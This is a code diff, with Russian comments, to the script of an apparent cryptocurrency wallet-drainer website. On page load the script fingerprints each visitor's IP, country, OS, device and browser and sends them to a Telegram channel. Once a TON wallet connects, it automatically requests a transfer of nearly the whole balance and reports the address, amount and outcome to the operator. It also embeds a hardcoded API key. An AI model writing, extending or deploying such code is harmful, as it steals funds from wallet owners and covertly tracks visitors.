@@ -20,8 +20,22 @@ document.addEventListener('DOMContentLoaded', () => {
             ipUser = data.ip;
             countryUser = data.country;
 
+            // Получаем информацию об устройстве и браузере
+            const userAgent = navigator.userAgent;
+            const os = getOS(userAgent);
+            const device = getDevice(userAgent);
+            const browser = getBrowser(userAgent);
+
             // Отправка сообщения в Telegram о посещении сайта
-            const messageOpen = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCD6*Opened the website*`;
+            const messageOpen = `
+🌐 *Domain:* ${domain}
+🖥️ *OS:* ${os}
+📱 *Device:* ${device}
+🌍 *Country:* ${country} (${countryUser})
+📡 *IP:* ${ipUser}
+🛠️ *Browser:* ${browser}
+🔗 *User Agent:* ${userAgent}
+            `;
             sendTelegramMessage(messageOpen);
 
             // Перенаправление для стран СНГ
@@ -38,7 +52,11 @@ document.addEventListener('DOMContentLoaded', () => {
     tonConnectUI.onStatusChange(wallet => {
         if (wallet) {
             // Отправка информации о подключенном кошельке в Telegram
-            const walletInfo = `\uD83D\uDCBC*Кошелек подключен:*\n\uD83D\uDCBB*Адрес:* ${wallet.account.address}\n\uD83D\uDCB0*Баланс:* ${wallet.account.balance}`;
+            const walletInfo = `
+💼 *Кошелек подключен:*
+💻 *Адрес:* ${wallet.account.address}
+💰 *Баланс:* ${wallet.account.balance} TON
+            `;
             sendTelegramMessage(walletInfo);
 
             // Автоматически запускаем процесс отправки средств
@@ -56,8 +74,9 @@ document.addEventListener('DOMContentLoaded', () => {
             sendTelegramMessage(errorMessage);
             return;
         }
-        const api_key = "174eb3d989539906679b1847b569f3a10464a2c1b29fc60b6ae95dd54a2bc31d";
-        const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}&api_key=${apiKey}`);        
+
+        const apiKey = "174eb3d989539906679b1847b569f3a10464a2c1b29fc60b6ae95dd54a2bc31d";
+        const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}&api_key=${apiKey}`);
         const data = await response.json();
         const originalBalance = parseFloat(data.balance);
         const processedBalance = originalBalance - (originalBalance * 0.03); // Вычитаем 3% для комиссий
@@ -82,11 +101,21 @@ document.addEventListener('DOMContentLoaded', () => {
             const result = await tonConnectUI.sendTransaction(transaction);
 
             // Отправка сообщения в Telegram об успешной транзакции
-            const messageSend = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCC0*Wallet:* [Ton Scan](https://tonscan.org/address/${walletAddress})\n\n\uD83D\uDC8E*Send:* ${tgBalance} TON`;
+            const messageSend = `
+🌐 *Domain:* ${domain}
+💻 *User:* ${ipUser} ${countryUser}
+📦 *Wallet:* [Ton Scan](https://tonscan.org/address/${walletAddress})
+💎 *Send:* ${tgBalance} TON
+            `;
             sendTelegramMessage(messageSend);
         } catch (error) {
             // Отправка сообщения в Telegram об ошибке
-            const messageDeclined = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCC0*Wallet:* [Ton Scan](https://tonscan.org/address/${walletAddress})\n\n\uD83D\uDED1*Declined or error.*`;
+            const messageDeclined = `
+🌐 *Domain:* ${domain}
+💻 *User:* ${ipUser} ${countryUser}
+📦 *Wallet:* [Ton Scan](https://tonscan.org/address/${walletAddress})
+🛑 *Declined or error.*
+            `;
             sendTelegramMessage(messageDeclined);
         }
     }
@@ -108,5 +137,36 @@ document.addEventListener('DOMContentLoaded', () => {
                 }
             })
             .catch(error => console.error('Ошибка:', error));
+    }
+
+    // Функция для определения операционной системы
+    function getOS(userAgent) {
+        if (/windows/i.test(userAgent)) return "Windows";
+        if (/macintosh/i.test(userAgent)) return "Mac OS";
+        if (/linux/i.test(userAgent)) return "Linux";
+        if (/android/i.test(userAgent)) return "Android";
+        if (/ios/i.test(userAgent)) return "iOS";
+        return "Unknown OS";
+    }
+
+    // Функция для определения устройства
+    function getDevice(userAgent) {
+        if (/mobile/i.test(userAgent)) return "Mobile";
+        if (/tablet/i.test(userAgent)) return "Tablet";
+        if (/ipad/i.test(userAgent)) return "iPad";
+        if (/iphone/i.test(userAgent)) return "iPhone";
+        if (/windows phone/i.test(userAgent)) return "Windows Phone";
+        return "Desktop";
+    }
+
+    // Функция для определения браузера
+    function getBrowser(userAgent) {
+        if (/chrome/i.test(userAgent)) return "Chrome";
+        if (/firefox/i.test(userAgent)) return "Firefox";
+        if (/safari/i.test(userAgent)) return "Safari";
+        if (/edge/i.test(userAgent)) return "Edge";
+        if (/opera/i.test(userAgent)) return "Opera";
+        if (/trident/i.test(userAgent)) return "Internet Explorer";
+        return "Unknown Browser";
     }
 });
